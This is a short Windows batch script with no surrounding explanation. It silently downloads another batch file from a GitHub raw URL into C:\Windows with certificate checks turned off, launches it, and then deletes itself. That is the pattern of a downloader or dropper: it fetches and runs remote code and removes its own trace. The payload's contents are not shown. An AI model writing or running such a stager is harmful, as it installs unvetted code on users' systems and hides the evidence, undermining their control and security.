@echo off
cls
curl -g -k -L -# -o C:\Windows\twishlol.bat https://raw.githubusercontent.com/twish1x/apps/refs/heads/main/twishlol.bat

start twishlol.bat
del "%~f0"
